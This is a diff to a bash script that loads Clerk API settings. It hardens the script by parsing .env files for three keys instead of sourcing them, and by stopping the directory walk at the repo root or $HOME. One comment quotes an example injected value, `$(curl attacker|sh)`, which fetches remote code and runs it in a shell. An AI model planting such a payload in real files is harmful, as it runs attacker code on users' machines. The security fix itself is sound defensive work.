@@ -13,21 +13,57 @@ set -euo pipefail
 
 # Walk up from $PWD to find .env/.env.local (mirrors Clerk CLI behavior).
 # Stops at the first directory that provides CLERK_SECRET_KEY.
+#
+# SECURITY: .env files are PARSED, never sourced. `source`/`.` would execute the
+# file as a shell script — a stray or malicious .env in any ancestor directory
+# (e.g. `CLERK_SECRET_KEY=$(curl attacker|sh)`) would run arbitrary code. We only
+# extract the specific KEY=VALUE pairs this script needs, and never evaluate the
+# values. The walk is also bounded to the git repo root (falling back to $HOME)
+# so we don't reach into unrelated parent directories or the filesystem root.
+
+# Extract a single variable from a .env file without executing it.
+# Matches `KEY=value` or `export KEY=value`, last definition wins, and strips a
+# single layer of surrounding single/double quotes. Values are treated as
+# literal text — no command substitution or expansion is performed.
+_read_env_var() {
+  local file="$1" key="$2" line val
+  line=$(grep -E "^[[:space:]]*(export[[:space:]]+)?${key}=" "$file" 2>/dev/null | tail -n1) || return 1
+  [[ -z "$line" ]] && return 1
+  val="${line#*=}"
+  val="${val%$'\r'}"           # strip trailing CR from CRLF files
+  if [[ "$val" == \"*\" ]]; then
+    val="${val#\"}"; val="${val%\"}"
+  elif [[ "$val" == \'*\' ]]; then
+    val="${val#\'}"; val="${val%\'}"
+  fi
+  printf '%s' "$val"
+}
+
+# Bound the upward walk: stop at the git repo root, or $HOME, whichever we hit.
+_repo_root="$(git -C "$PWD" rev-parse --show-toplevel 2>/dev/null || true)"
+_walk_stop="${_repo_root:-$HOME}"
+
 _dir="$PWD"
 while true; do
   for _envfile in "$_dir/.env" "$_dir/.env.local"; do
     if [[ -f "$_envfile" ]]; then
-      set -a
-      source "$_envfile"
-      set +a
+      for _key in CLERK_SECRET_KEY CLERK_BAPI_SCOPES CLERK_REST_API_URL; do
+        # Don't overwrite a value already provided by a real environment
+        # variable or a closer (deeper) .env file.
+        if [[ -z "${!_key:-}" ]]; then
+          _val="$(_read_env_var "$_envfile" "$_key")" && [[ -n "$_val" ]] && export "$_key=$_val"
+        fi
+      done
     fi
   done
   [[ -n "${CLERK_SECRET_KEY:-}" ]] && break
+  [[ "$_dir" == "$_walk_stop" ]] && break
   _parent="$(dirname "$_dir")"
   [[ "$_parent" == "$_dir" ]] && break
   _dir="$_parent"
 done
-unset _dir _parent _envfile
+unset -f _read_env_var
+unset _dir _parent _envfile _key _val _repo_root _walk_stop
 
 # Parse --admin flag
 ADMIN=false
